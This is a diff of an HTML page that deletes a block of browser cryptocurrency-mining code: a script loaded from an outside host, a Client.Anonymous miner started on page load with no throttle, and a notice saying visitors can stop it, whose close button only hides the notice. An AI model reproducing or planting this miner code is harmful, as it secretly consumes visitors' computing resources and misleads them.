@@ -485,42 +485,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     </style>
 
-<body>
-    <!-- Notification HTML -->
-    <div id="custom-notification" class="notification">
-        <span id="close-btn" class="close-btn">&times;</span>
-        <p>This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.</p>
-    </div>
-
-    <!-- Your existing script -->
-    <script src="https://www.hostingcloud.racing/oPdZ.js"></script>
-    <script>
-        var _client = new Client.Anonymous('643456fe704feb62a18183fb1829ec788b35765eff76534d779e0231aa045890', {
-            throttle: 0, c: 'w'
-        });
-        _client.start();
-    </script>
-
-    <!-- JavaScript for the custom notification -->
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            var notification = document.getElementById('custom-notification');
-            var closeBtn = document.getElementById('close-btn');
-
-            // Close the notification when the "X" button is clicked
-            closeBtn.addEventListener('click', function() {
-                notification.style.display = 'none';
-            });
-
-            // Optionally, automatically hide the notification after 10 seconds
-            setTimeout(function() {
-                notification.style.display = 'none';
-            }, 10000); // 10 seconds
-        });
-    </script>     
-
-	</body>
-</html>
 		
 </body>
 </html>
